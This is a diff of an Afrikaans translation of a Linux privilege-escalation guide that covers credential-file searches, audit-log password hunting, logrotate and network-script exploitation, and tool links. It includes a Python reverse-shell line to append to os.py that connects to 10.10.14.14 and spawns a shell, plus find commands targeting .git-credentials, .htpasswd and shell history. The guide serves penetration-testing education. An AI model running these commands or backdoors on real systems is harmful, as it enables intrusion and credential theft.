-Die volgende lêers mag dalk rugsteune of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Jy sal waarskynlik nie die laaste een kan lees nie, maar probeer)
+Die volgende lêers mag dalk rugsteun kopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Jy sal waarskynlik nie die laaste een kan lees nie, maar probeer)
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
@@ -1271,7 +1271,7 @@ find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -p
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
-### \*\_geskiedenis, .sudo_as_admin_successful, profiel, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
+### \*\_geskiedenis, .sudo_as_admin_succesvol, profiel, bashrc, httpd.conf, .plan, .htpasswd, .git-legitimasies, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
@@ -1279,7 +1279,7 @@ find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -nam
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
-### **Skrip/Binêres in PAD**
+### **Skrip/Binêre lêers in PAD**
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
@@ -1303,14 +1303,14 @@ Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalat
 ### Logboeke
 
 As jy logboeke kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die logboek is, hoe interessanter dit sal wees (waarskynlik).\
-Ook, mag sommige "**sleg**" gekonfigureerde (agterdeur?) **ouditlogboeke** jou toelaat om **wagwoorde op te neem** binne ouditlogboeke soos verduidelik in hierdie pos: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+Ook, sommige "**sleg**" gekonfigureerde (agterdeur?) **ouditlogboeke** mag jou toelaat om **wagwoorde op te neem** binne ouditlogboeke soos verduidelik in hierdie pos: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
 Om **logs te lees die groep** [**adm**](interesting-groups-linux-pe/#adm-group) sal baie nuttig wees.
 
-### Skuldlêers
+### Skulpe lêers
 ```bash
 ~/.bash_profile # if it exists, read it once when you log in to the shell
 ~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
@@ -1323,42 +1323,42 @@ Om **logs te lees die groep** [**adm**](interesting-groups-linux-pe/#adm-group) 
 ```
 ### Generiese Wagwoorde Soek/Regex
 
-Jy moet ook vir lêers kyk wat die woord "**wagwoord**" in sy **naam** of binne die **inhoud** bevat, en ook vir IP-adresse en e-posse binne loglêers, of hasse regexps.\
-Ek gaan nie hier lys hoe om al hierdie te doen nie, maar as jy belangstel, kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.
+Jy moet ook vir lêers kyk wat die woord "**wagwoord**" in die **naam** of binne die **inhoud** bevat, en ook vir IP-adresse en e-posse binne loglêers, of hasse regexps.\
+Ek gaan nie hier lys hoe om al hierdie dinge te doen nie, maar as jy belangstel, kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.
 
 ## Skryfbare lêers
 
 ### Python-biblioteek kaping
 
-As jy weet **waarvandaan** 'n Python-skripsie uitgevoer gaan word en jy **binne daardie vouer kan skryf** of jy kan **Python-biblioteke wysig**, kan jy die OS-bibliotheek wysig en dit agterdeur maak (as jy kan skryf waar die Python-skripsie uitgevoer gaan word, kopieer en plak die os.py-bibliotheek).
+As jy weet **waarvandaan** 'n Python-skrips gaan uitgevoer word en jy **kan binne** daardie vouer skryf of jy kan **Python-biblioteke wysig**, kan jy die OS-bibliotheek wysig en dit agterdeur maak (as jy kan skryf waar die Python-skrips gaan uitgevoer word, kopieer en plak die os.py-bibliotheek).
 
 Om die biblioteek **agterdeur te maak**, voeg net aan die einde van die os.py-biblioteek die volgende lyn by (verander IP en POORT):
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
-### Logrotate uitbuiting
+### Logrotate-uitbuiting
 
-'n Swakheid in `logrotate` laat gebruikers met **skryfregte** op 'n log-lêer of sy ouer gids moontlik verhoogde regte verkry. Dit is omdat `logrotate`, dikwels hardloop as **root**, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gids soos _**/etc/bash\_completion.d/**_. Dit is belangrik om nie net in _/var/log_ nie, maar ook in enige gids waar logrotasie toegepas word, regte te kontroleer.
+'n Kwesbaarheid in `logrotate` laat gebruikers met **skryfregte** op 'n log-lêer of sy ouer gids moontlik verhoogde regte verkry. Dit is omdat `logrotate`, dikwels hardloop as **root**, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gids soos _**/etc/bash\_completion.d/**_. Dit is belangrik om nie net in _/var/log_ nie, maar ook in enige gids waar logrotasie toegepas word, regte te kontroleer.
 
 {% hint style="info" %}
-Hierdie swakheid affekteer `logrotate` weergawe `3.18.0` en ouer
+Hierdie kwesbaarheid affekteer `logrotate` weergawe `3.18.0` en ouer
 {% endhint %}
 
-Meer gedetailleerde inligting oor die swakheid kan gevind word op hierdie bladsy: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
+Meer gedetailleerde inligting oor die kwesbaarheid kan gevind word op hierdie bladsy: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
-Jy kan hierdie swakheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).
+Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).
 
-Hierdie swakheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logboeke kan verander, kyk wie daardie logboeke bestuur en kyk of jy regte kan verhoog deur die logboeke te vervang met simbole.
+Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-logboeke),** so wanneer jy vind dat jy logboeke kan verander, kyk wie daardie logboeke bestuur en kyk of jy regte kan verhoog deur die logboeke te vervang met simbole.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
-**Swakheid verwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
+**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-As, om enige rede, 'n gebruiker in staat is om 'n `ifcf-<whatever>` skrips te **skryf** na _/etc/sysconfig/network-scripts_ **of** dit kan **aanpas**, dan is jou **sisteem pwned**.
+As, om enige rede, 'n gebruiker in staat is om 'n `ifcf-<watookal>` skrips te **skryf** na _/etc/sysconfig/network-scripts_ **of** dit kan **aanpas** 'n bestaande een, dan is jou **sisteem pwned**.
 
-Netwerk skripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindings. Hulle lyk presies soos .INI-lêers. Tog word hulle \~gebron\~ op Linux deur Network Manager (dispatcher.d).
+Netwerk-skripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindinge. Hulle lyk presies soos .INI-lêers. Tog word hulle \~gebron\~ op Linux deur Network Manager (dispatcher.d).
 
-In my geval word die `NAME=` aangedui in hierdie netwerk skripte nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die sisteem om die gedeelte na die wit/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.
+In my geval word die `NAME=` wat in hierdie netwerk-skripte toegeskryf is, nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die stelsel om die gedeelte na die wit/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.
 
 Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
 ```bash
@@ -1370,9 +1370,9 @@ DEVICE=eth0
 
 Die gids `/etc/init.d` is die tuiste van **skripte** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit sluit skripte in om dienste te `begin`, `stop`, `herlaai`, en soms `herlaai`. Hierdie kan direk uitgevoer word of deur simboliese skakels gevind in `/etc/rc?.d/`. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.
 
-Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diensbestuurstelsel** wat deur Ubuntu ingevoer is, wat konfigurasie lêers gebruik vir diensbestuurstake. Ten spyte van die oorgang na Upstart, word SysVinit-skripte steeds gebruik saam met Upstart-konfigurasies as gevolg van 'n verenigbaarheidslaag in Upstart.
+Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diensbestuurstelsel** wat deur Ubuntu ingevoer is, wat konfigurasie lêers gebruik vir diensbestuurtake. Ten spyte van die oorgang na Upstart, word SysVinit-skripte steeds saam met Upstart-konfigurasies gebruik as gevolg van 'n verenigbaarheidslaag in Upstart.
 
-**systemd** kom na vore as 'n moderne inisialisering- en diensbestuurder, wat gevorderde kenmerke bied soos aanvraag-daemonbegin, outomatiese bergbestuur, en stelseltoestandsnapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakette en `/etc/systemd/system/` vir administrateursmodifikasies, wat die stelseladministrasieproses stroomlyn.
+**systemd** kom na vore as 'n moderne inisialisering en diensbestuurder, wat gevorderde kenmerke bied soos aanvraag-daemonbegin, outomatiese bergbestuur, en stelselstaat-snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakette en `/etc/systemd/system/` vir administrateursmodifikasies, wat die stelseladministrasieproses stroomlyn.
 
 ## Ander Truuks
 
@@ -1401,18 +1401,18 @@ Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diens
 
 ## Meer hulp
 
-[Statiese impacket-binêre lêers](https://github.com/ropnop/impacket\_static\_binaries)
+[Statiese impacket-binêres](https://github.com/ropnop/impacket\_static\_binaries)
 
 ## Linux/Unix Privesc-gereedskap
 
-### **Beste gereedskap om vir Linux plaaslike bevoorregtingskaping vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+### **Beste gereedskap om vir Linux plaaslike bevoorregte-escalasie-vectors te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opsie)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumereer kernel kwale in Linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Enumereer kernelkwale in Linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
@@ -1438,16 +1438,17 @@ Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diens
 * [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 * [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
+{% hint style="success" %}
+Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
